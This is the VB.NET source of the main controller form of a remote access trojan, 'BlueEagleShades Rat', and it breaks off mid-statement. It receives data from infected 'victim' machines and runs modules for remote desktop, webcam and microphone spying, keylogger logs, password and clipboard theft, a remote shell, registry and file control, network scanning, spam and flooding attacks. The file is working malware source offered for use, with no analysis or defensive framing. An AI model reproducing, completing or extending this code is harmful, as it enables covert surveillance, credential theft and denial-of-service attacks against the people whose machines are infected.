Imports System.Text
Imports System.IO
Imports System.Windows.Forms.ListView
Imports System.Net.Sockets

Public Class Form1

    Dim countrycode As String
    Public ssport As Integer
#Region "Variables"
    Public ipp As String = ""
    Public sock As Integer
    Public WithEvents s As New SocketServer
    Public yy As String = "||"
    Delegate Sub chatappd(ByVal data1 As String)
    Dim hping As String
    Private Declare Function BlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
    Private Declare Function ShowCursor Lib "user32" (ByVal lShow As Long) As Long
    Public pinger As Integer = 0
    Private Declare Auto Sub SendMessage Lib "user32.dll" (ByVal hWnd As Integer, ByVal msg As UInt32, ByVal wParam As UInt32, ByVal lparam As Integer)
    Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Public Declare Function SwapMouseButton Lib "user32" Alias "SwapMouseButton" (ByVal bSwap As Long) As Long
    Const TASKBAR_SHOW As Integer = &H40
    Const TASKBAR_HIDE As Integer = &H80
    Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Private Const SETDESKWALLPAPER = 20
    Private Const UPDATEINIFILE = &H1
    Public Sz As Size
    Public tictoc As Integer = 0
    Public pw As String = "jordan"
    Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr

#End Region
    Function QZ(ByVal q As Integer) As Size '  Lower Size of image
        Dim zs As New Size(Sz)
        Select Case q
            Case 0
                Return Sz
            Case 1
                zs.Width = zs.Width / 1.1
                zs.Height = zs.Height / 1.1
            Case 2
                zs.Width = zs.Width / 1.3
                zs.Height = zs.Height / 1.3
            Case 3
                zs.Width = zs.Width / 1.5
                zs.Height = zs.Height / 1.5
            Case 4
                zs.Width = zs.Width / 1.9
                zs.Height = zs.Height / 1.9
            Case 5
                zs.Width = zs.Width / 2
                zs.Height = zs.Height / 2
            Case 6
                zs.Width = zs.Width / 2.1
                zs.Height = zs.Height / 2.1
            Case 7
                zs.Width = zs.Width / 2.2
                zs.Height = zs.Height / 2.2
            Case 8
                zs.Width = zs.Width / 2.5
                zs.Height = zs.Height / 2.5
            Case 9
                zs.Width = zs.Width / 3
                zs.Height = zs.Height / 3
            Case 10
                zs.Width = zs.Width / 3.5
                zs.Height = zs.Height / 3.5
            Case 11
                zs.Width = zs.Width / 4
                zs.Height = zs.Height / 4
            Case 12
                zs.Width = zs.Width / 5
                zs.Height = zs.Height / 5
            Case 13
                zs.Width = zs.Width / 6
                zs.Height = zs.Height / 6
            Case 14
                zs.Width = zs.Width / 7
                zs.Height = zs.Height / 7
            Case 15
                zs.Width = zs.Width / 8
                zs.Height = zs.Height / 8
            Case 16
                zs.Width = zs.Width / 9
                zs.Height = zs.Height / 9
            Case 17
                zs.Width = zs.Width / 10
                zs.Height = zs.Height / 10

        End Select
        zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
        zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
        Return zs
    End Function
    Sub connected(ByVal sock As Integer) Handles s.Connected
        s.Send(sock, "info") ' طلب البانات عن حدوث اتصال

    End Sub
    Sub disconnected(ByVal sock As Integer) Handles s.DisConnected
        Try ' مصيده اخطاء

            l1.Items(sock.ToString).Remove()


        Catch ex As Exception

        End Try
    End Sub

   
    Public Sub PktToImage(ByVal BY As Byte())
        If CheckBox2.Checked Then
            For Each x As ListViewItem In l1.SelectedItems
                If l1.SelectedItems.Count = 1 Then
                    s.Send(x.ToolTipText, "@@" & yy & c1.SelectedIndex & yy & c2.Text & yy & c.Value)
                End If
            Next
        End If

        Dim B As Array = fx(BY, "njq8")
        Dim Q As New IO.MemoryStream(CType(B(1), Byte()))
        Dim L As Bitmap = Image.FromStream(Q)
        Dim QQ As String() = Split(BS(B(0)), ",")
        ' Me.Text = "Remote Desktop  " & "Size: " & siz(BY.LongLength) & " ,Changes: " & QQ.Length - 2
        Dim K As Bitmap = P1.Image.GetThumbnailImage(CType(Split(QQ(0), ".")(0), Integer), CType(Split(QQ(0), ".")(1), Integer), Nothing, Nothing)
        Dim G As Graphics = Graphics.FromImage(K)
        Dim tp As Integer = 0
        For i As Integer = 1 To QQ.Length - 2
            Dim P As New Point(Split(QQ(i), ".")(0), Split(QQ(i), ".")(1))
            Dim SZ As New Size(L.Width, Split(QQ(i), ".")(2))
            G.DrawImage(L.Clone(New Rectangle(0, tp, L.Width, CType(Split(QQ(i), ".")(2), Integer)), L.PixelFormat), New Point(CType(Split(QQ(i), ".")(0), Integer), CType(Split(QQ(i), ".")(1), Integer)))

            tp += SZ.Height
        Next
        G.Dispose()
        P1.Image = K
    End Sub
    Delegate Sub _data(ByVal sock As Integer, ByVal b As Byte())

    Public Shared Function DEB(ByRef s As String) As String
        Dim str As String
        Dim num As Integer = 0
Label_0002:
        Try
            Dim bytes As Byte() = Convert.FromBase64String(s)
            str = Encoding.UTF8.GetString(bytes)
        Catch exception1 As Exception
            Dim exception As Exception = exception1
            num += 1
            If (num = 3) Then
                str = Nothing
            Else
                s = (s & "=")
                GoTo Label_0002
            End If
        End Try
        Return str
    End Function

    Sub chatappds(ByVal data1 As String)
        Dim f As New chat
        f.TextBox1.Text = f.TextBox1.Text & f.Victimename & " said : " & data1 & vbNewLine
    End Sub
    Sub data(ByVal sock As Integer, ByVal b As Byte()) Handles s.Data
        Dim a As String() = Split(BS(b), "||")
        Try
            Select Case a(0)
                Case "downloadtherec"
                    IO.File.WriteAllBytes(Application.StartupPath & "\BlueEagleShades_Rat_Victims\Sound" & tictoc & ".wav", Convert.FromBase64String(a(1)))
                    My.Computer.Audio.Play(Application.StartupPath & "\BlueEagleShades_Rat_Victims\Sound" & tictoc & ".wav", AudioPlayMode.WaitToComplete)
                Case "clipss"
                    Dim f As CP = My.Application.OpenForms("clipss" & sock)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _data(AddressOf data), New Object() {sock, b})
                            Exit Sub
                        End If
                        f = New CP
                        f.sock = sock
                        f.Name = "clipss" & sock
                        f.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                        f.Text = "Get ClipBoard" & " - " & s.IP(sock)
                        f.Show()
                    End If
                Case "recvcli"
                    Dim f As CP = My.Application.OpenForms("clipss" & sock)
                    f.TextBox1.Text = a(1)
                Case "openRG"
                    Dim regedit As Regedit = My.Application.OpenForms("regedit" & sock)
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim regediti As New Regedit
                    regediti.Name = "regedit" & sock
                    regediti.sock = sock
                    regediti.Text = "regeditistry" & " - " & s.IP(sock)
                    regediti.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                    regediti.Show()
                Case "RG"
                    Dim regedit As Regedit = My.Application.OpenForms("regedit" & sock)
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Select Case a(1)
                        Case "~"
                            regedit.RGk.Enabled = True
                            regedit.RGLIST.Enabled = True
                            regedit.RGk.SelectedNode.Nodes.Clear()
                            regedit.RGLIST.Items.Clear()
                            regedit.pr.Value = 0
                            regedit.pr.Maximum = (a.Length - 3)
                            Dim num20 As Integer = (a.Length - 1)
                            Dim i As Integer = 3
                            Do While (i <= num20)
                                Try
                                    regedit.pr = regedit.pr
                                    regedit.pr.Value += 1
                                    If (a(i).Length > 0) Then
                                        If a(i).Contains("/") Then
                                            Dim strArray2 As String() = Strings.Split(a(i), "/", -1, CompareMethod.Binary)
                                            Dim item As ListViewItem = regedit.RGLIST.Items.Add(strArray2(0))
                                            item.SubItems.Add(strArray2(1))
                                            Try
                                                item.SubItems.Add(strArray2(2))
                                            Catch exception17 As Exception

                                                Dim exception3 As Exception = exception17

                                            End Try
                                            If (strArray2(1) = "String") Then
                                                item.ImageIndex = 1
                                            Else
                                                item.ImageIndex = 2
                                            End If
                                        Else
                                            regedit.RGk.SelectedNode.Nodes.Add(a(i))
                                        End If
                                    End If
                                Catch exception18 As Exception

                                    Dim exception4 As Exception = exception18

                                End Try
                                i += 1
                            Loop
                            regedit.RGk.SelectedNode.Expand()
                            regedit.RGk.Select()
                            regedit.RGk.Focus()
                            Dim num21 As Integer = (regedit.RGLIST.Columns.Count - 1)
                            Dim j As Integer = 0
                            Do While (j <= num21)
                                regedit.RGLIST.Columns.Item(j).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
                                j += 1
                            Loop
                            regedit.pr.Value = 0

                            Exit Select

                    End Select
                Case "F"
                Case "AW"
                    For i As Integer = 0 To l1.Items.Count - 1
                        If l1.Items.Item(i).SubItems(1).Text = s.IP(sock) Then
                            l1.Items.Item(i).SubItems(8).Text = a(1)
                            Exit For
                        End If
                    Next
                Case "edittextfile"
                    If My.Application.OpenForms("Text_Editor" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim texter As New Text_Editor
                    texter.sock = sock
                    texter.Name = "Text_Editor" & sock
                    texter.Text = texter.Text & " " & a(1) & " " & s.IP(sock)
                    texter.pathoftext = a(1)
                    texter.TextBox1.Text = a(2)
                    texter.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                    texter.Show()
                Case "viewimage"
                    Dim fff As fm = My.Application.OpenForms("openfm" & sock)
                    If a(1) = "Error" Then
                        MsgBox("Recived String Cannot be converted to image please check the file is an image file ")
                    Else
                        Dim picbyte() As Byte = Convert.FromBase64String(a(1))
                        Dim ms As New MemoryStream(picbyte)
                        fff.pic1.Show()
                        fff.pic1.Image = Image.FromStream(ms)
                    End If

                Case "downloadtherec"
                    IO.File.WriteAllBytes(Application.StartupPath & "\BlueEagleShades_Rat_Victims\Sound" & tictoc & ".wav", Convert.FromBase64String(a(1)))
                    My.Computer.Audio.Play(Application.StartupPath & "\BlueEagleShades_Rat_Victims\Sound" & tictoc & ".wav", AudioPlayMode.WaitToComplete)

                Case "requestrecords"
                    If My.Application.OpenForms("Microphone" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim fm As New REG
                    fm.sock = sock
                    fm.Name = "Microphone" & sock
                    fm.Text = fm.Text & " " & s.IP(sock)
                    fm.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                    fm.Show()
                    While My.Computer.FileSystem.FileExists(Application.StartupPath & "\BlueEagleShades_Rat_Victims" & tictoc & ".wav")
                        tictoc = tictoc + 1
                    End While
                Case "getpath"
                    Dim fff As fm = My.Application.OpenForms("openfm" & sock)
                    fff.TextBox1.Text = a(1)
                    s.Send(sock, "FileManager" & yy & a(1))
                Case "sendinformation"
                    Timer1.Stop()
                    If My.Application.OpenForms("Information" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim info As New Information
                    info.sock = sock
                    info.Name = "Information" & sock
                    info.Text = info.Text & " " & s.IP(sock)
                    info.rtinfo.Text = "Victime Name : " & a(30) & vbNewLine & "Local Ip Address : " & s.IP(sock) & vbNewLine & "Port : " & a(21) & vbNewLine & "Version : " & a(8) & vbNewLine & "Ping : " & pinger & " ms" & vbNewLine & "Server Path : " & a(22)
                    info.rtinfo1.Text = "Username : " & a(2) & vbNewLine & "Victime Name : " & a(30) & vbNewLine & "Country : " & a(5) & vbNewLine & "Language : " & a(19) & vbNewLine & "Antivirus : " & a(6) & vbNewLine & "Webcam : " & a(9) & vbNewLine & "Active Window : " & a(10) & vbNewLine & "Local Time : " & a(11) & vbNewLine & "Computer Open : " & a(12) & vbNewLine & "Current Directory : " & a(13) & vbNewLine & "Command Line : " & a(20) & "System Directory : " & a(14) & vbNewLine & "User Domain Name : " & a(15) & vbNewLine & "User Interactive : " & a(16) & vbNewLine & "Working Set : " & a(17)
                    info.rtinfo2.Text = "Computer Name : " & a(1) & vbNewLine & "Operating System : " & a(3) & vbNewLine & "Operating System Platform : " & a(4) & vbNewLine & "Operating System version : " & a(18) & vbNewLine & "RAM : " & a(7) & vbNewLine & "Processor Name : " & a(23) & vbNewLine & "Identifier : " & a(24) & vbNewLine & "System Product : " & a(25) & vbNewLine & "BIOS Release Date : " & a(26) & vbNewLine & "BIOS Version : " & a(27) & vbNewLine & "System Manufacturer : " & a(28) & vbNewLine & "BIOS Vendor : " & a(29)
                    info.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                    info.Show()
                    pinger = 0
                Case "rss"
                    If My.Application.OpenForms("rs" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim cmd As New CMD
                    cmd.sock = sock
                    cmd.Name = "rs" & sock
                    cmd.Text = cmd.T2.Text
                    cmd.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                    cmd.Show()

                Case "rs"
                    Dim shl2 As CMD = My.Application.OpenForms("rs" & sock)
                    If (Not shl2 Is Nothing) Then
                        Dim box As RichTextBox = shl2.T1
                        SyncLock box
                            shl2.T1.SelectionStart = shl2.T1.TextLength
                            shl2.T1.AppendText((DEB(a(1).Replace(ChrW(13) & ChrW(10), "")) & ChrW(13) & ChrW(10)))
                            shl2.T1.SelectionStart = shl2.T1.TextLength
                            shl2.T1.ScrollToCaret()
                        End SyncLock
                    End If
                    Return
                Case "rsc"
                    Dim shl3 As CMD = My.Application.OpenForms("sh" & sock)
                    If (Not shl3 Is Nothing) Then
                        shl3.Close()
                    End If

                Case "downloadedfile"
                    IO.File.WriteAllBytes(Application.StartupPath & "\BlueEagleShades_Rat_Victims\" & a(2), Convert.FromBase64String(a(1)))
                    Threading.Thread.CurrentThread.Sleep(1000)


                Case "chatback"
                    'MessageBox.Show("New cht message ", "Victim Replied ", MessageBoxButtons.OK, MessageBoxIcon.Information)
                    Dim Ff As chat = My.Application.OpenForms("Chat" & sock)

                    Ff.TextBox1.Text &= "Victim Said: " & a(1)
                    Invoke(New chatappd(AddressOf chatappds), a(1))
                    Exit Sub
                Case "readytochat"
                    If My.Application.OpenForms("Chat" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim fm As New chat
                    fm.sock = sock
                    fm.Name = "Chat" & sock
                    fm.Text = fm.Text & " " & s.IP(sock)
                    fm.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                    fm.Show()
                Case "fun"
                    If My.Application.OpenForms("fun" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim fm As New Fun
                    fm.sock = sock
                    fm.Name = "fun" & sock
                    fm.Text = fm.Text & s.IP(sock)
                    fm.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                    fm.f = Me
                    fm.Show()
                Case "ProcessManager"
                    Dim f As Form7 = My.Application.OpenForms("\\" & sock)
                    Dim allProcess As String() = Split(a(1), "ProcessSplit") 'Message.Substring(15).Split("ProcessSplit")
                    For i = 0 To allProcess.Length - 2
                        Dim itm As New ListViewItem
                        itm.Text = allProcess(i)
                        itm.SubItems.Add(allProcess(i + 1))
                        itm.SubItems.Add(allProcess(i + 2))
                        itm.SubItems.Add(allProcess(i + 3))
                        itm.ImageIndex = 0
                        f.ListView1.Items.Add(itm)
                        i += 3
                    Next
                Case "spam"
                    If l1.FindItemWithText(s.IP(sock)) Is Nothing Then
                        s.Disconnect(sock)
                    End If
                    Dim f As spa = My.Application.OpenForms("spam" & sock)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _data(AddressOf data), New Object() {sock, b})
                            Exit Sub
                        End If
                        f = New spa
                        f.sock = sock
                        f.Name = "spam" & sock
                        f.Text = f.Text & " | " & a(1)
                        f.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                        f.Show()
                    End If
                Case "\\"
                    If My.Application.OpenForms("\\" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim f As New Form7
                    f.sock = sock
                    f.Name = "\\" & sock
                    f.Text &= s.IP(sock)
                    f.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                    f.Show()

                Case "info" ' اضفه السيرفر الي الليست


                    Dim f As s = My.Application.OpenForms("new" & sock)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _data(AddressOf data), New Object() {sock, b})
                            Exit Sub
                        End If

                        f = New s
                        f.Name = "new" & sock
                        f.Label1.Text = s.IP(sock)
                        f.Label2.Text = a(1)
                        f.Label6.Text = a(2)
                        f.Label7.Text = a(3)
                        f.Label5.Text = a(4)


                        f.Show()

                        Dim l = l1.Items.Add(sock.ToString, a(1), GetCountryNumber(UCase(a(4))))
                        l.SubItems.Add(s.IP(sock))
                        l.SubItems.Add(a(2))
                        l.SubItems.Add(a(3))
                        l.SubItems.Add(a(4))
                        l.SubItems.Add(a(6))
                        l.SubItems.Add(a(7))
                        l.SubItems.Add(a(5))
                        l.SubItems.Add(a(6))
                        l.ToolTipText = sock
                       
                        NotifyIcon1.BalloonTipIcon = ToolTipIcon.Info
                        NotifyIcon1.BalloonTipTitle = "Blue Eagle Nofiy "
                        NotifyIcon1.BalloonTipText = "[ Name : " & a(1) & " IP : " & s.IP(sock) & " Country : " & a(3) & " ]"
                        Beep()
                        NotifyIcon1.ShowBalloonTip(1)

                    End If

                Case "openpw"
                    If My.Application.OpenForms("openpw" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim fm As New pw
                    fm.sock = sock
                    fm.Name = "openpw" & sock
                    fm.Text = fm.Text & s.IP(sock)
                    fm.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                    fm.Show()
                Case "getpw"
                    Dim f As pw = My.Application.OpenForms("openpw" & sock)
                    Dim aa As String() = Split(a(1), "|")

                    Try
                        For i = 2 To aa.Length
                            Dim ii As New ListViewItem
                            ii.Text = aa(i)
                            ii.SubItems.Add(aa(i + 2))
                            ii.SubItems.Add(aa(i + 4))
                            ii.ImageIndex = 0
                            f.ListView1.Items.Add(ii)
                            i += 5

                        Next
                    Catch ex As Exception
                    End Try

                Case "opentto"
                    If My.Application.OpenForms("opentto" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim fm As New Form13
                    fm.sock = sock
                    fm.Name = "opentto" & sock
                    fm.Text = fm.Text & s.IP(sock)
                    fm.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                    fm.Show()

                Case "openkl"
                    If My.Application.OpenForms("openkl" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim f As New Form27
                    f.sock = sock
                    f.Name = "openkl" & sock
                    f.Text = f.Text & s.IP(sock)
                    f.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                    f.Show()
                    ' Case "logf"
                    '    Dim F As Form7 = My.Application.OpenForms("openlo" & sock)
                    '   Dim logsf As String() = Split(A(1), "|")
                    '  For i As Integer = 0 To logsf.Length - 2
                    'Dim ii As New ListViewItem
                    'ii.Text = logsf(i)
                    'f.ListView1.Items.Add(ii)
                    'Next

                Case "getlogs"
                    Dim F As Form27 = My.Application.OpenForms("openkl" & sock)
                    F.TextBox1.Text = a(1)


                Case "FLOOD"
                    If l1.FindItemWithText(s.IP(sock)) Is Nothing Then
                        s.Disconnect(sock)
                    End If
                    Dim f As Form14 = My.Application.OpenForms("FLOOD" & sock)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _data(AddressOf data), New Object() {sock, b})
                            Exit Sub
                        End If
                        f = New Form14
                        f.Sock = sock
                        f.Name = "FLOOD" & sock
                        f.Text += " | " & a(1)
                        f.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                        f.Show()
                    End If

                Case "camlist"
                    Dim f As Form16 = My.Application.OpenForms("cam" & sock)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _data(AddressOf data), New Object() {sock, b})
                            Exit Sub
                        End If
                        f = New Form16
                        f.Name = "cam" & sock
                        f.sock = sock
                        For i As Integer = 1 To a.Length - 1
                            f.ComboBox1.Items.Add(a(i))
                        Next
                        f.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                        f.Show()

                    End If
                Case "cam"
                    Dim f As Form16 = My.Application.OpenForms("cam" & sock)
                    If f IsNot Nothing Then
                        If a.Length = 2 Then
                            Dim m As New IO.MemoryStream(Convert.FromBase64String(a(1)))
                            SyncLock f.PictureBox1
                                f.PictureBox1.Image = Image.FromStream(m)
                            End SyncLock
                        End If
                    End If


                Case "viewlan"
                    If My.Application.OpenForms("viewlan" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim f As New Lan
                    f.sock = sock
                    f.Name = "viewlan" & sock
                    f.Text = "Lan View For : " & s.IP(sock)
                    f.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)


                    f.Show()


                Case "getlan"

                    Dim F As Lan = My.Application.OpenForms("viewlan" & sock)
                    Dim hacked As String = Me.l1.SelectedItems(0).SubItems(2).Text
                    Dim substring As String = hacked.Substring(0, 3)
                    If a(1).Contains(substring) Then
                        Dim l1 = F.ListView1.Items.Add(a(1))
                        F.ListView1.Items(F.i).ImageIndex = 1
                        F.i += 1
                    Else
                        Dim l1 = F.ListView1.Items.Add(a(1))
                        F.ListView1.Items(F.i).ImageIndex = 0
                        F.i += 1
                    End If



                Case "pcip"
                    Dim F As Lan = My.Application.OpenForms("viewlan" & sock)
                    F.Label1.Text = a(1)

                Case "lanresults"
                    Dim F As Lan = My.Application.OpenForms("viewlan" & sock)
                    If a(1).Contains("open") Then
                        Dim l1 = F.ListView2.Items.Add(a(1))
                        F.ListView2.Items(F.jj).ImageIndex = 1
                        F.jj += 1
                    Else
                        Dim l1 = F.ListView2.Items.Add(a(1))
                        F.ListView2.Items(F.jj).ImageIndex = 0
                        F.jj += 1
                    End If

                Case "opensacnner"

                    If My.Application.OpenForms("scanner" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim f As New scanner
                    f.sock = sock
                    f.Name = "scanner" & sock

                    f.BlackShadesNetForm1.Text &= " " & s.IP(sock)


                    f.Show()

                Case "scanresults"
                    Dim F As scanner = My.Application.OpenForms("scanner" & sock)
                    If a(1).Contains("open") Then
                        Dim l1 = F.ListView1.Items.Add(a(1))
                        F.ListView1.Items(F.jj).ImageIndex = 1
                        F.jj += 1
                    Else
                        Dim l1 = F.ListView1.Items.Add(a(1))
                        F.ListView1.Items(F.jj).ImageIndex = 0
                        F.jj += 1
                    End If
                Case "openfm2"
                    If My.Application.OpenForms("openfm2" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim f As New Form20
                    f.sock = sock
                    f.Name = "openfm2" & sock
                    f.Text = "Manage Installed Program For : " & s.IP(sock)
                    Dim allprog As String() = Split(a(1), "Splitplogmanager")
                    For i = 0 To allprog.Length - 2
                        Dim itm As New ListViewItem
                        itm.Text = allprog(i)
                        If Not itm.Text = "" Then

                            ' f.ListBox1.Items.Add(itm)
                            f.ProgramsLvw.Items.Add(itm)
                        End If
                        i += 1
                    Next
                    f.ProgramsLvw.Columns(0).Text = "Name" & " | " & f.ProgramsLvw.Items.Count & " Program Found"
                    f.Show()
                Case "openinstall"
                    If l1.FindItemWithText(s.IP(sock)) Is Nothing Then
                        s.Disconnect(sock)
                    End If
                    Dim f As Form20 = My.Application.OpenForms("openinstall" & sock)
                    f.Enabled = False
                    Dim allprog As String() = Split(a(1), "Splitplogmanager")
                    For i = 0 To allprog.Length - 2
                        Dim itm As New ListViewItem
                        itm.Text = allprog(i)
                        If Not itm.Text = "" Then

                            '  f.ListBox1.Items.Add(itm)

                        End If
                        i += 1 '
                    Next
                    f.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                    f.Show()


                Case "openfm"
                    If My.Application.OpenForms("openfm" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim fm As New fm
                    fm.sock = sock
                    fm.Name = "openfm" & sock
                    fm.Text = fm.Text & s.IP(sock)
                    fm.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                    fm.Show()
                Case "openpw"
                    If My.Application.OpenForms("openpw" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub

                    End If
                    Dim f As pw
                    f.sock = sock
                    f.Name = "openpw" & sock
                    f.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                    f.Show()
                    'f.Button1.PerformClick()


                Case ("FileManager")
                    Dim fff As fm = My.Application.OpenForms("openfm" & sock)
                    If a(1) = "Error" Then
                        fff.Button1.PerformClick()
                    Else
                        fff.ListView1.Items.Clear()
                        Dim allFiles As String() = Split(a(1), "FileManagerSplit")
                        For i = 0 To allFiles.Length - 2
                            Dim itm As New ListViewItem
                            itm.Text = allFiles(i)
                            itm.SubItems.Add(allFiles(i + 1))
                            If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
                                Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                If fsize > 1073741824 Then
                                    Dim size As Double = fsize / 1073741824
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                ElseIf fsize > 1048576 Then
                                    Dim size As Double = fsize / 1048576
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                ElseIf fsize > 1024 Then
                                    Dim size As Double = fsize / 1024
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                Else
                                    itm.SubItems(1).Text = fsize.ToString & " B"
                                End If
                                itm.Tag = Convert.ToInt64(allFiles(i + 1))
                            End If
                            If itm.Text.StartsWith("[Drive]") Then
                                itm.ImageIndex = 0
                                itm.Text = itm.Text.Substring(7)
                            ElseIf itm.Text.StartsWith("[CD]") Then
                                itm.ImageIndex = 1
                                itm.Text = itm.Text.Substring(4)
                            ElseIf itm.Text.StartsWith("[Folder]") Then
                                itm.ImageIndex = 2
                                itm.Text = itm.Text.Substring(8)
                            ElseIf itm.Text.EndsWith(".exe") Then
                                itm.ImageIndex = 3
                            ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".bmp") Then
                                itm.ImageIndex = 4
                            ElseIf itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".txt") Then
                                itm.ImageIndex = 5
                            ElseIf itm.Text.EndsWith(".dll") Then
                                itm.ImageIndex = 6
                            ElseIf itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".rar") Then
                                itm.ImageIndex = 7
                            Else
                                itm.ImageIndex = 8

                            End If

                            fff.ListView1.Items.Add(itm)
                            i += 1
                        Next
                        fff.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent)
                    End If
                Case "!!" ' i recive size of client screen
                    c1.Items.Clear()
                    c2.Items.Clear()
                    Sz = New Size(a(1), a(2))
                    For i As Integer = 0 To 17
                        c1.Items.Add(QZ(i))
                    Next
                    For i As Integer = 1 To 10
                        c2.Items.Add(i)
                    Next
                    P1.Image = New Bitmap(Sz.Width, Sz.Height)
                    c1.SelectedIndex = 17
                    c2.SelectedIndex = 9

                    If CheckBox2.Checked = False Then c2.SelectedIndex = 0
                    s.Send(sock, "@@" & yy & c1.SelectedIndex & yy & c2.Text & yy & c.Value)
                Case "@@" ' i recive image  

                    Dim BB As Byte() = fx(b, "@@" & yy)(1)

                    PktToImage(BB)
                Case "!" ' i recive size of client screen
                    ' lets start Cap form and start capture desktop
                    If My.Application.OpenForms("!" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
